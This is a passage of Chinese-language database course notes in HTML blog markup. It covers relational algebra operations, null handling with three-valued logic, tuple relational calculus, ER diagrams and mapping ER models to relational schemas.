∪ s</li><li>定义为：r ∪ s = { t | t ∈ r or t ∈ s }</li><li>要使并运算r∪s有意义<ol><li>r，s必须是<strong>同元</strong>的（属性数目必须相同）</li><li>属性的域必须相容（如r的第二列的属性类型必须和s的第二列类型相同）</li></ol></li><li>示例：找出开设在2009年秋季学期或者2010年春季学期或者这二者皆开的所有的课程：  Π<sub>course_id</sub> (σ<sub> semester = “Fall” Λ year=2009</sub> (section) )  ∪<br>Π<sub>course_id</sub> (σ<sub> semester=“Spring” Λ year=2010</sub> (section) )</li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/25.jpg" alt></p><h4 id="集合差运算"><a href="#集合差运算" class="headerlink" title="集合差运算"></a>集合差运算</h4><ul><li>记法：r - s</li><li>定义为：r - s = { t | t ∈ r and t ∉ s }</li><li>必须保证集合差运算在相容的关系间进行<ul><li>r 和 s必须是同元的</li><li>r 和 s属性的域必须相容</li></ul></li><li>示例：找出开设在2009年秋季学期但是在2010年春季学期不开的课程：<br>Π<sub>course_id</sub> (σ<sub> semester = “Fall” Λ year=2009</sub> (section) )  -<br>Π<sub>course_id</sub> (σ<sub> semester=“Spring” Λ year=2010</sub> (section) )</li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/26.jpg" alt></p><h5 id="基本运算的分配律"><a href="#基本运算的分配律" class="headerlink" title="基本运算的分配律"></a>基本运算的分配律</h5><ul><li>投影和并可以分配<ul><li>Π<sub>pid,name</sub>(S∪T) ≡ Π<sub>pid,name</sub>(S)  ∪ Π<sub>pid,name</sub>(T) </li></ul></li><li>投影和差不可分配</li></ul><h4 id="笛卡儿积运算"><a href="#笛卡儿积运算" class="headerlink" title="笛卡儿积运算"></a>笛卡儿积运算</h4><ul><li><p>记法：r × s</p></li><li><p>定义为：r × s = { tq | t ∈ r and q∈ s }</p><ul><li>元组的连串（Concatenation）：若r = (r1,..,rn)，s = (s1,…,sm)，则定义r与s的连串为一个n+m的元组，记作rs = (r1,…,rn,s1,s…,sm)</li></ul></li><li><p>假设关系r(R)和s(S)的属性不相交（即R ∩ S = Φ ）</p></li><li><p>如果关系r(R)和s(S)的属性有相交的，则必须使用更名运算</p></li><li><p>示例：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/27.jpg" alt></p></li></ul><h5 id="运算的组合"><a href="#运算的组合" class="headerlink" title="运算的组合"></a>运算的组合</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/28.jpg" alt></p><p>如图为一个例子</p><h4 id="更名运算-1"><a href="#更名运算-1" class="headerlink" title="更名运算"></a>更名运算</h4><ul><li>允许通过更名来引用关系代数表达式的结果</li><li>允许引用一个关系时使用多于一个的名字</li><li>如： ρ<sub>X</sub>(E) ：返回更名为X的表达式E的结果</li><li>如果关系代数表达式E时n元的，则 ρ <sub>χ(A1,A2,…,An)</sub>(E) ，返回被更名为X的表达式E的结果，并且属性被更名为A1，A2，…，An</li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/29.jpg" alt></p><h4 id="关系代数表达式嵌套"><a href="#关系代数表达式嵌套" class="headerlink" title="关系代数表达式嵌套"></a>关系代数表达式嵌套</h4><ul><li>关系代数中基本的表达式是如下二者之一：<ul><li>数据库中的一个关系</li><li>一个常数关系</li></ul></li><li>n设E1 和E2是关系代数表达式，则以下这些都是关系代数表达式：<ul><li>E1 ∪ E2</li><li>E1 – E2</li><li>E1 x E2</li><li>σ<sub>p</sub> (E1), 其中P是E1的属性上的谓词</li><li>Π<sub>s</sub>(E1),其中S 是E1中某些属性的列表</li><li>ρ<sub>x</sub> (E1),其中x 是E1结果的新名字</li></ul></li></ul><h4 id="附加关系代数运算"><a href="#附加关系代数运算" class="headerlink" title="附加关系代数运算"></a>附加关系代数运算</h4><ul><li>附加运输没有实质地扩展关系代数的能力，但是简化了查询的书写<ul><li>集合交</li><li>自然连接</li><li>赋值</li><li>外连接</li></ul></li></ul><p>#### </p><h4 id="集合交运算"><a href="#集合交运算" class="headerlink" title="集合交运算"></a>集合交运算</h4><ul><li>记法：r ∩ s</li><li>定义为： r ∩ s = { t | t ∈ r and t ∈ s }<ul><li>r 和 s 是同元的</li><li>r 和 s 属性域相容</li></ul></li><li>注： r ∩ s = r - ( r - s ) = s - ( s - r )</li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/30.jpg" alt></p><h4 id="θ连接"><a href="#θ连接" class="headerlink" title="θ连接"></a>θ连接</h4><p>定义：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/31.jpg" alt></p><ul><li>所以，θ连接是做笛卡儿积，然后筛选出符合AθB表达式的元组作为结果返回</li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/32.jpg" alt></p><h4 id="自然连接运算"><a href="#自然连接运算" class="headerlink" title="自然连接运算"></a>自然连接运算</h4><ul><li>记法：r ⋈ s</li><li>定义：关系 r 和 s 分别是模式 R 和 S 的关系，则 r ⋈ s 是由如下方式得到的模式 R ∪ S 的关系<ul><li>对于 r 中的每个元组 t<sub>r</sub> 和 s 中的每个元组 t<sub>s</sub> 所组成的元组对</li><li>如果 t<sub>r</sub> 和 t<sub>s</sub> 在 R ∩ S的属性上有相同的值，则在结果中加入一个元组t，并且：<ul><li>t 在r上和 t<sub>r</sub> 有相同的值</li><li>t 在s上和 t<sub>s</sub> 有相同的值</li></ul></li></ul></li><li>示例：若R = (A,B,C,D) ，S = (E,B,D) ，结果模式 = (A,B,C,D,E) ，则 r ⋈ s =<br>Π<sub>r.A, r.B, r.C, r.D, s.E </sub> ( σ<sub> r.B = s.B Λ r.D = s.D </sub>(r × s ) )</li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/32.jpg" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/33.jpg" alt></p><ul><li><p>自然连接和等值连接的不同</p><ul><li>自然连接中相等的分量必须是相同的属性组，并且要在结果中去掉重复的属性，二等值连接则不必</li></ul></li><li><p>当 R 与 S 无相同属性时， R ⋈ S = R × S</p></li><li><p>可交换，可结合</p><ul><li>s ⋈ sc ≡ sc ⋈ s</li><li>( s ⋈ sc ) ⋈ c ≡ s ⋈ ( sc ⋈ c )</li></ul></li></ul><h4 id="赋值运算"><a href="#赋值运算" class="headerlink" title="赋值运算"></a>赋值运算</h4><ul><li>赋值运算（⬅）提供了一种简化关系代数表达式书写的方式<ul><li>把查询表达为一个顺序程序，由以下构成<ul><li>一系列赋值</li><li>一个其值被作为查询结果显示的表达式</li></ul></li><li>赋值必须是赋给一个临时关系变量</li></ul></li></ul><h4 id="外连接-1"><a href="#外连接-1" class="headerlink" title="外连接"></a>外连接</h4><ul><li>外连接运算是连接运算的扩展，可以处理缺失的信息</li><li>计算连接，然后一个关系中失配的元组添加到结果中</li><li>使用空值（null）：<ul><li><code>null</code>代表一个值未知或不存在</li><li>所有的包含<code>null</code>比较运算都被定义为<code>false</code></li></ul></li><li>示例：</li></ul><p>现有关系如下图：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/34.jpg" alt></p><p>有连接、左外连接、右外连接、全外连接如下：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/35.jpg" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/36.jpg" alt></p><p>连接即将表做笛卡儿积，筛选出相同属性拥有相同值的元组，将其连接起来成为一个新的元组</p><p>左外连接即保证左表的主码完整性，右外连接保证右表的主码完整性</p><p>全外连接保证全部数据的不被舍弃</p><p>均用空值<code>null</code>填补空白的属性</p><p>外连接运算可以用基本关系代数表示</p><h4 id="空值-1"><a href="#空值-1" class="headerlink" title="空值"></a>空值</h4><ul><li>元组的一些属性可以为空值，用<code>null</code>表示</li><li><code>null</code>代表一个值未知或不存在，空值是一种状态，不是一个明确的值</li><li>含有<code>null</code>的算数表达式的结果为<code>null</code></li><li>聚集函数直接忽略空值（比如在SQL里）</li><li>在去重和分组运算中，<code>null</code>和其他值一样，两个<code>null</code>被看作是相同的值</li></ul><ul><li>含有空值的比较运算的结果是一个特殊的值：<code>unknown</code><ul><li>如果用 <code>false</code> 取代 <code>unknown</code>，那么 <code>not (A &lt; 5)</code> 和 <code>A &gt;= 5</code>不等价</li></ul></li><li>使用<code>unknown</code>的三值逻辑<ul><li>or：<code>(unknown or true) = true</code>，<code>(unknown or false) = unknown</code>，<code>(unknown or unknown) = unknown</code></li><li>and：<code>(unknown and true) = unknown</code>，<code>(unknown and false) = falses</code>，<code>(unknown and unknown) = unknown</code></li><li>not：<code>not unknown = unknown</code> </li><li>在SQL中，若谓词P的值为unknown，则<code>P is unknown = true</code></li></ul></li><li>选择（select）谓词的结果如果是<code>unknown</code>，则相当于<code>false</code></li></ul><h4 id="除运算"><a href="#除运算" class="headerlink" title="除运算"></a>除运算</h4><ul><li>定义：给定两个关系 r(R) 和 s(S) ，并且 S ⊂ R，则  r ÷ s 是满足 t × s ⊆ r 的最大关系t(R-S)</li><li>可以将 r ÷ s 写为：temp1 ⬅ Π<sub>R-S</sub>(r) ，temp2 ⬅ Π<sub>R-S</sub>( (temp1 × s)  - Π<sub>R-S, S</sub>(r) ) ，result = temp1 - temp2</li><li>示例： r÷s给出的学生ID选了Biology系卡的所有课<br>r(ID, course_id) = Π<sub> ID, course_id</sub>(takes) 且 s(course_id) = Π<sub>course_id</sub>(σ<sub>dept_name = “Boilogy” </sub>(course))</li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/37.jpg" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/38.jpg" alt></p><h4 id="扩展的关系代数运算"><a href="#扩展的关系代数运算" class="headerlink" title="扩展的关系代数运算"></a>扩展的关系代数运算</h4><ul><li>广义投影</li><li>聚集函数</li></ul><h4 id="广义投影"><a href="#广义投影" class="headerlink" title="广义投影"></a>广义投影</h4><ul><li>定义：Π<sub>F<sub>1</sub>,F<sub>2</sub>,…,F<sub>n</sub></sub>(E) ，E是任意关系代数表达式，Fi是涉及常量以及E的模式种属性的算术表达式</li><li>广义投影运算允许在投影列表中使用算术函数来对投影进行扩展</li><li>示例：给定关系 instructor(ID, name, dept_name, salary) 其中salary 是年薪， 可以得到每个教师的ID、name、dept_name及每月的工资： Π<sub>ID, name, dept_name, salary/12</sub>(instructor)</li></ul><h4 id="聚集函数-1"><a href="#聚集函数-1" class="headerlink" title="聚集函数"></a>聚集函数</h4><ul><li><p>聚集函数：输入值的一个汇集，将单一值作为结果返回</p><blockquote><ul><li>avg：平均值</li><li>min：最小值</li><li>max：最大值</li><li>sum：求和</li><li>count：计数</li></ul></blockquote></li><li><p>示例：</p></li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/39.jpg" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/40.jpg" alt></p><ul><li>聚集的结果没有名称<ul><li>可以使用更名运算给他命名</li><li>为方便起见，我们允许把更名作为聚集运算的一部分</li></ul></li></ul><h4 id="多重关系代数"><a href="#多重关系代数" class="headerlink" title="多重关系代数"></a>多重关系代数</h4><ul><li>纯关系代数删除所有的重复</li><li>多重集关系代数保存重复，为了匹配SQL的语义</li><li>多重集关系代数定义为：<ul><li>选择：和输入关系中的满足选择条件的元组个数一样多</li><li>投影：每个输入元组产生一个元组，即使有重复也保留</li><li>叉积：如果关系 <em>r</em> 的元组 <em>t1</em> 有<em>m</em>个副本，关系<em>s</em> 的元组 <em>t2</em> 有 <em>n**个</em>副本，则关系<em>r</em>  x <em>s</em>的元组<em>t1.t2</em>有<em>m</em> x <em>n</em>个副本</li><li>类似的，其他的操作为</li><li>示例：并：<em>m</em> + <em>n</em>个副本，交：min(<em>m, n</em>)个副本，差：min(0, <em>m</em> – <em>n</em>)个副本</li></ul></li></ul><p>具体可以见SQL的多重关系运算==&gt; <a href="####重复">#集合运算与重复</a></p><h3 id="元组关系演算"><a href="#元组关系演算" class="headerlink" title="元组关系演算"></a>元组关系演算</h3><ul><li><p>元组关系演算是非过程化的查询语言，查询表达式的形式为：<code>{ t | P(t) }</code></p></li><li><p>表示它是所有使谓词P为真的元组 t 的集合</p></li><li><p>t 为元组变量，t[A] 表示元组 t 在属性A上的值</p></li><li><p>t ∈ r 表示元组 t 在关系 r 中</p></li><li><p>P是一个类似于<strong>谓词演算</strong>的公式，由原子公式和运算符组成</p><ul><li>原子公式<ul><li>s ∈ R：s是关系R中的一个元组</li><li>s[x] θ u[y] ：s[x]与u[y] 为元组分量，他们之间满足比较关系θ</li><li>s[x] θ c：分量s[x]与常量c之间满足比较关系θ</li></ul></li><li>公示的递归定义<ul><li>原子公式是公式</li><li>如果P是公式，那么  ﹁P 和 (P) 也是公式</li><li>如果P1、P2是公式，则 P1 ∧ P2， P1 ∨ P2 ，P1 &rArr; P2也是公式</li><li>如果P(t) 是公式，R是关系， 则 ∃ t ∈ R (P(t)) 和 ∀ t ∈ R  (P(t)) 也是公式</li></ul></li></ul><blockquote><p>谓词演算公式：</p><ul><li>属性和常量的集合</li><li>比较运算符的集合（&lt;，≤，=，≠，&gt;，≥）</li><li>连词的集合（and，or，not）</li><li>蕴含（&rArr; ）： x &rArr; y，如果x为真，则y也为真。 x &rArr; y ≡ ﹁ x &or; y</li><li>量词的集合：∃ 和 ∀ </li></ul></blockquote></li></ul><h4 id="表达式的安全性"><a href="#表达式的安全性" class="headerlink" title="表达式的安全性"></a>表达式的安全性</h4><ul><li>元组关系演算表达式可能产生一个无线的关系</li><li>为了避免产生无限关系，我们将限制所允许的表达式集合为安全表达式</li></ul><h3 id="元组关系演算与关系代数的等价性"><a href="#元组关系演算与关系代数的等价性" class="headerlink" title="元组关系演算与关系代数的等价性"></a>元组关系演算与关系代数的等价性</h3><ul><li>投影：    Π<sub>A</sub>(R) = { t | ∃s ∈ R，(t[A] = s[A]) }</li></ul><ul><li>选择：    σF(A)(R) = { t | t ∈ R ∧ F(t[A]) }</li></ul><ul><li>广义笛卡尔积：    R(A) × S(B) = { t | ∃u∈R, ∃s∈S ，( t[A] = u[A] ∪ t[B] = s[B])}</li></ul><ul><li>并：    R ∪ S = { t | t ∈ R &or; t ∈ S }</li></ul><ul><li>差：    R - S = { t | t ∈ R &and;  ﹁ t ∈ S }</li></ul><h2 id="数据库设计与ER模型"><a href="#数据库设计与ER模型" class="headerlink" title="数据库设计与ER模型"></a>数据库设计与ER模型</h2><h3 id="设计模型概览"><a href="#设计模型概览" class="headerlink" title="设计模型概览"></a>设计模型概览</h3><h4 id="数据库设计-1"><a href="#数据库设计-1" class="headerlink" title="数据库设计"></a>数据库设计</h4><ul><li>工程性</li><li>有基本的对错问题</li><li>不能简单的以对/错论述问题<ul><li>不同的工程方法可以达到工程目的</li><li>对错概念被弱化</li></ul></li><li>强调优劣好坏<ul><li>好优的工程可以以较小代价，取得较好/高的成果</li></ul></li><li>强调多数人的看法和评价</li></ul><p><strong>软件生命周期瀑布模型</strong>如下图</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/41.jpg" alt="软件生命周期瀑布模型"></p><h4 id="需求分析的目标、内容和结果"><a href="#需求分析的目标、内容和结果" class="headerlink" title="需求分析的目标、内容和结果"></a>需求分析的目标、内容和结果</h4><ul><li><p>需求分析的目标</p><ul><li>澄清用户需求</li><li>为系统设计和实现奠定基础</li></ul></li><li><p>需求分析的内容</p><ul><li>数据分析：包括数据结构、关系、约束、语义等等</li><li>加工逻辑分析：对数据如何进行加工、处理、变换</li><li>流程分析：动作间的先后次序，以及相互关系</li><li>其他：界面要求、性能需求</li></ul></li><li><p>需求分析的结果</p><ul><li>用户需求规格说明书（简称需求说明书）</li></ul></li></ul><h3 id="实体-联系模型"><a href="#实体-联系模型" class="headerlink" title="实体-联系模型"></a>实体-联系模型</h3><p>实体联系模型（Entity Relationship Diagram），简称ER图</p><ul><li><h4 id="ER图的位置"><a href="#ER图的位置" class="headerlink" title="ER图的位置"></a>ER图的位置</h4><ul><li>数据分析、描述的工具</li><li>数据分析、描述以E-R图为主</li><li>需要其他文档辅助</li></ul></li><li><h4 id="ER图的作用"><a href="#ER图的作用" class="headerlink" title="ER图的作用"></a>ER图的作用</h4><ul><li>帮助澄清用户数据需求，分析员和用户对数据需求达成高度一致</li><li>数据逻辑模型设计的基础</li></ul></li><li><h4 id="ER图的要求和评价标准"><a href="#ER图的要求和评价标准" class="headerlink" title="ER图的要求和评价标准"></a>ER图的要求和评价标准</h4><ul><li>清晰、易懂</li><li>完整、精确、无二义</li></ul></li><li><h4 id="需要关注的主要缺陷"><a href="#需要关注的主要缺陷" class="headerlink" title="需要关注的主要缺陷"></a>需要关注的主要缺陷</h4><ul><li>冗余</li><li>不完整</li></ul></li></ul><p>一个数据库可以建模成①一组实体集；②多个实体间的相互关联</p><p><strong>实体</strong>是现实世界中可区别于所有其他对象的一个“事务”或“对象”</p><ul><li><strong>实体具有属性</strong></li></ul><p>一个<strong>实体集</strong>是相同类型即具有相同性质（或属性）的一个实体集合</p><p>联系集是相同类型联系的集合</p><p><strong>联系集</strong>是 <code>n ≥ 2</code> 个（可能相同的）实体集上的数学联系。如果E1，E2，…，En是实体集，那么联系集 R 是 { (e1,e2,…,en) | ei ∈ Ei }</p><p>联系也可以具有<strong>描述性属性</strong></p><blockquote><p>例如，考虑实体集 instructor 和 student 之间的联系集 advisor <em>。</em> 我们可以将属性 date 与该联系关联起来，以表示教师成为学生的导师的日期。 </p></blockquote><h5 id="联系集的度"><a href="#联系集的度" class="headerlink" title="联系集的度"></a>联系集的度</h5><p>二元联系集：涉及两个实体集（或说度为2）；数据库系统中的大部分联系集都是二元的。</p><h5 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h5><p>实体通过一组属性来表示，属性是实体集中每个成员所拥有的描述性性质</p><p><strong>域</strong>：每个属性都有一个可取值的集合</p><ul><li>属性类型<ul><li>简单（Simple） and 复合（Composite）属性</li><li>单值（Single-valued） and 多值（Multivalued）属性</li><li>派生（Derived）属性</li></ul></li></ul><p>如下图，address就是一个复合属性</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/42.jpg" alt></p><h3 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h3><ul><li><h4 id="映射基数"><a href="#映射基数" class="headerlink" title="映射基数"></a>映射基数</h4><ul><li>表示一个实体通过一个联系集能关联的实体的个数</li><li>在描述二元联系集时非常有用</li><li>对于实体集A和B之间的二元联系集R来说，映射基数必然是以下情况之一<ul><li>一对一（One to one）</li><li>一对多（One to many）</li><li>多对一（Many to one）</li><li>多对多（Many to many）</li></ul></li></ul></li></ul><h4 id="参与"><a href="#参与" class="headerlink" title="参与"></a>参与</h4><p>参与：Participation：实体集之间的关联称为参与，即实体参与联系</p><h4 id="码-1"><a href="#码-1" class="headerlink" title="码"></a>码</h4><p>实体集的<strong>超码</strong>是一个或多个属性的集合，这些属性的值可以是我们唯一地标识一个实体</p><p>实体集的<strong>候选码</strong>是一个最小的超码</p><p>虽然可能存在多个候选码，只有一个候选码能被选为<strong>主码</strong></p><p>==&gt;详细定义可见 <a href="###码">码的定义</a></p><p>联系集的码：参与实体集合的主键组合形成联系集的超码</p><ul><li>NOTE：这意味着<strong>一对实体在特定联系集中至多有一个关系</strong></li></ul><p>决定候选码的时候必须考虑联系集的映射基数</p><p>在选择主键的时候要考虑联系集的语义信息以防有多个候选码</p><h5 id="冗余属性"><a href="#冗余属性" class="headerlink" title="冗余属性"></a>冗余属性</h5><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 例</span></span><br><span class="line">假设我们拥有实体集</span><br><span class="line"><span class="keyword">instructor </span>(具有属性 dept_name),</span><br><span class="line">department</span><br><span class="line">和一个关系<span class="keyword">inst_dept </span>联系 <span class="keyword">instructor </span>和 department</span><br><span class="line">实体 <span class="keyword">instructor </span>中属性 dept_name  是冗余的，因为有明确的关系<span class="keyword">inst_dept </span>联系<span class="keyword">instructors </span>和 departments</span><br><span class="line">属性dept_name 在两个实体集中都出现了，他在实体集 <span class="keyword">instructor </span>中是冗余的，需要将其移除。</span><br><span class="line"><span class="keyword">BUT: </span>when converting <span class="keyword">back </span>to tables, in some cases the attribute gets reintroduced, as we will see.</span><br></pre></td></tr></table></figure><h3 id="实体-联系图"><a href="#实体-联系图" class="headerlink" title="实体-联系图"></a>实体-联系图</h3><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/43.jpg" alt></p><ul><li>分成两部分的矩形代表实体集</li><li>菱形代表联系集</li><li>属性在实体集矩形中列出</li><li>构成主码的属性用下划线标明</li><li>若联系集拥有属性，则用虚线引出一个矩形，在矩形中标明属性</li></ul><h5 id="角色-1"><a href="#角色-1" class="headerlink" title="角色"></a>角色</h5><p>一个关系的实体集必须是互异的，实体在联系中扮演的功能称为实体的角色</p><p>如图，标签<code>course_id</code>和<code>prereq_id</code>被称作角色</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/44.jpg" alt></p><h5 id="基数约束"><a href="#基数约束" class="headerlink" title="基数约束"></a>基数约束</h5><p>我们在所讨论的联系集和实体集之间画一个箭头（→）或一条线段（—）来表示基数约束</p><ul><li>一对一关系<ul><li>如图，instructor 和 student 之间的一对一关系<br>通过 advisor一名教师至多指导一名学生<br>通过 advisor一名学生至多可以有一位导师。</li></ul></li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/45.jpg" alt></p><ul><li>一对多关系<ul><li>instructor 和 student 之间的一对多关系<br>通过 advisor一名教师可以指导多名学生（包含0名）<br>通过 advisor一名学生至多可以有一位导师</li></ul></li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/46.jpg" alt></p><ul><li>多对一关系<ul><li>instructor 和 student 的多对一关系<br>通过 advisor一名教师可以指导至多一名学生<br>通过 advisor一名学生可以有多名导师(包括0名)</li></ul></li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/47.jpg" alt></p><ul><li>多对多关系<ul><li>通过 advisor一名教师可以指导多名学生<br>通过 advisor一名学生可以有多位导师 </li></ul></li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/48.jpg" alt></p><ul><li>带有箭头的线表示只对应一个，没有箭头的线代表可以有多个对应</li></ul><h5 id="全部参与"><a href="#全部参与" class="headerlink" title="全部参与"></a>全部参与</h5><p>全部参与（用双线表示）：实体集中的每个实体在联系集中至少参与了一个关系</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/49.jpg" alt></p><p>如图，每个section（部门）都必须有一个相关的课程</p><h5 id="基数限制的可选标记"><a href="#基数限制的可选标记" class="headerlink" title="基数限制的可选标记"></a>基数限制的可选标记</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/50.jpg" alt></p><p><strong>上下界约束</strong>：A1，A2，…，An之间的多元联系，Ak端的基数约束L..H表示：对来自{A1,A2…,Ak-1,Ak+1,…,An}集合的每个实体组，至少和L个、至多和H个来自Ak的实体关联</p><p>(该说法与教材相反)</p><h3 id="弱实体集"><a href="#弱实体集" class="headerlink" title="弱实体集"></a>弱实体集</h3><ul><li>没有足够的属性以形成主码的实体集称作<strong>弱实体集</strong></li><li>弱实体集存在依赖于<strong>标识实体集</strong><ul><li>标识性联系是从弱实体集到标识实体集多对一的，并且弱实体集在练习中的参与是全部的</li><li><strong>标识性联系</strong>以双菱形表示</li></ul></li><li>弱实体集的<strong>分辨符</strong>是使得我们可以区分依赖于特定强实体集的弱实体集中的实体的属性的集合</li><li>弱实体集的主码是有标识实体集的主码加上该弱实体集的分辨符构成的</li><li>弱实体集的分辨符以虚下划线标明，而不是实线</li><li>关联弱实体集和标识性强实体集的联系集以双菱形标识</li><li>示例如下，Section的主键（course_id，sec_id，semester，year）</li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/51.jpg" alt></p><h3 id="转化为关系模式"><a href="#转化为关系模式" class="headerlink" title="转化为关系模式"></a>转化为关系模式</h3><ul><li><h4 id="根据ER模型建立数据库模式的步骤"><a href="#根据ER模型建立数据库模式的步骤" class="headerlink" title="根据ER模型建立数据库模式的步骤"></a>根据ER模型建立数据库模式的步骤</h4><ol><li>ER图转换为表进行必要的合并<ul><li>本步可以按照机械方法完成</li><li>一个良好的ER图，完成本步转换和合并得到的结果，已经是比较理想的数据库模式</li></ul></li><li>优化<ul><li>本步无具体可行的机械方法</li><li>主要依靠设计人员的经验和能力</li></ul></li></ol></li></ul><ul><li>在数据库设计中，对于每个实体集和每个联系集，都有唯一的关系模式与之对应</li><li>可以将一个符合ER数据库模式的数据库表示为一些关系模式的集合</li><li>关系模式名即为相应地实体集或联系集的名称</li><li>每个模式有几列（类似于属性），每列有唯一的名字</li></ul><h4 id="具有简单属性的实体集的表示"><a href="#具有简单属性的实体集的表示" class="headerlink" title="具有简单属性的实体集的表示"></a>具有简单属性的实体集的表示</h4><ul><li>用具有n个不同属性的模式E来表示强实体集</li><li>用包含标识性强实体集的主键作为列构成的表来表示实体集</li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/52.jpg" alt></p><ul><li>多对多联系集表示为两个参与实体集主键属性和联系集中任何描述属性所组成的模式</li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/53.jpg" alt></p><h5 id="模式的冗余"><a href="#模式的冗余" class="headerlink" title="模式的冗余"></a>模式的冗余</h5><p>多对一和一对多联系集中全部参与的many一方可以通过增加额外的属性来表示，包含one一方的主键</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/54.jpg" alt></p><ul><li>对于一对一联系集，任意一边都可以作为many一方<ul><li>额外的属性可以加到类似于两个实体集的任一个表中</li></ul></li><li>若many一方是部分参与，利用many一方生成额外属性会导致存在空值</li><li>连接弱实体集与其依赖的强实体集的联系集的模式是冗余的</li></ul><h5 id="复合多值属性"><a href="#复合多值属性" class="headerlink" title="复合多值属性"></a>复合多值属性</h5><ul><li>复合属性可以在划分为更小的部分（即其他属性）</li><li>实体E的多值属性M用一个单独的关系模式EM标识<ul><li>关系模式EM有和E的主键相关的属性，有一个和多值属性M相关的属性</li></ul></li><li>多值属性的每个值和关系模式EM中的每个分离的元组相匹配</li></ul><h5 id="模式优化"><a href="#模式优化" class="headerlink" title="模式优化"></a>模式优化</h5><ul><li>关系模式设计方案的评价标准<ul><li>数据表示符合自然结构</li><li>清晰、简洁、易于理解</li><li>数据冗余小</li><li>数据访问效率高</li><li>结构易于扩展</li><li>。。。</li></ul></li><li>关系模式的设计<ul><li>设计方案的评价标准中，指标相互之间存在的矛盾</li><li>设计是在矛盾的指标中，评价选择最合适的方案</li><li>工程思想和方法、设计人员的经验和能力，对模式设计都是重要的</li></ul></li><li>E-R图转换为表 vs 模式优化设计<ul><li>一个良好的ER图，转换为表并进行必要的合并，得到的结果已经是比较理想的数据库模式</li><li>不排除还有人工进一步优化的余地</li><li>进一步的优化必须审慎，必须综合评价优化的优缺点</li></ul></li></ul><p>设计问题：用实体集还是属性集，用实体集还是联系集，二元还是n元联系集</p><h3 id="扩展的E-R特性"><a href="#扩展的E-R特性" class="headerlink" title="扩展的E-R特性"></a>扩展的E-R特性</h3><ul><li><h4 id="特化"><a href="#特化" class="headerlink" title="特化"></a>特化</h4><ul><li>自顶而下设计过程：实体集可能包含一些子集，子集中的实体在某些方面区别于实体集中的其他实体</li><li>这些子集变为低层次的实体集，拥有不适用于高层次实体集的属性或一些部分参与的关系</li><li>在E-R图中，特化用从特化实体指向另一个实体的空心箭头来表示，我们成这种关系为ISA关系</li><li><strong>属性继承</strong>：高层实体集的属性你可以被底层实体集继承。底层实体集（或子类）同时还继承地参与其高层实体（或超类）所参与的实体集</li></ul></li></ul><ul><li><h4 id="概化"><a href="#概化" class="headerlink" title="概化"></a>概化</h4><ul><li>自底而上的设计过程：多个实体集根据共同的特征给你综合成一个较高层的实体集</li><li><strong>概化只不过是特化的逆过程</strong>，在ER图中，我们对概化和特化的表示不做区分</li></ul></li></ul><ul><li>特化关系还可以形成超类：子类联系</li></ul><h4 id="特化-概化上的约束"><a href="#特化-概化上的约束" class="headerlink" title="特化/概化上的约束"></a>特化/概化上的约束</h4><ul><li>实体可以是给定低层次实体集成员的约束<ul><li>条件定义的</li><li>用户定义的</li></ul></li><li>另一类约束涉及在一个概化中另一个实体是否可以属于多个低层实体集<ul><li>不相交（Disjoint）<ul><li>不相交约束要求一个实体至多属于一个低层实体集</li><li>Noted：在ER图中，通过连接在同一个矩形上的多个低层次实体集表示</li></ul></li><li>重叠（overlapping）<ul><li>同一个实体可以同时属于同一个概化中的多个低层实体集</li></ul></li></ul></li></ul><ul><li>完整性约束：定义高层实体集中的另一个实体是否必须至少属于该概化/特化的一个低层实体集<ul><li>全部概化：每个高层实体必须属于一个低层实体集</li><li>部分概化：允许一些高层实体不属于任何低层实体集</li></ul></li></ul><ul><li>通过模式表示特化：<ul><li>Method1<ul><li>为高层实体集创建一个模式</li><li>每个低层实体集创建一个模式，模式中的属性包括对应低层实体集的每个属性，以及对应于高层实体集主码的每个属性</li><li>DrawBack：与低层关系模式有关的关系和与高层关系模式有关的关系</li></ul></li><li>Method2<ul><li>利用低层实体集的每个属性和对应于高层实体集的每个熟悉创建模式</li><li>如果特化是完全的，不需要存储概化实体集的信息(可以定义为包含特化关系并集的view，可能仍然需要显示的定义外键约束)</li><li>Drawback：可能会存在冗余</li></ul></li></ul></li></ul><h4 id="数据库设计的其他方面"><a href="#数据库设计的其他方面" class="headerlink" 